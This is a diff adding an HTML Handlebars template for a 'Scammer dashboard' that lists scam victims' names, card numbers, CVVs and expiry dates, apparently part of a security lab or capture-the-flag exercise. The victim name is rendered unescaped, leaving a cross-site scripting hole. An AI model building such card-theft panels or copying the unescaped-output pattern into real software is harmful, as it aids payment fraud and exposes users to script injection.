@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <title>Scammer dashboard</title>
+    </head>
+    <body>
+        <p class="pb-3">Here are new scam victims</p>
+        <div class="dash-frame">
+            {{#each payments}}
+            <p>
+                <ul>
+                    <li>Name: {{{this.owner_name}}}</li>
+                    <li>Card number: {{this.card_number}}</li>
+                    <li>CVV: {{this.cvv}}</li>
+                    <li>Expiry date: {{this.expire_date}}</li>
+                </ul>
+            </p>
+            {{else}}
+            <p>No new victims</p>
+            {{/each}}
+        </div>
+    </body>
+</html>
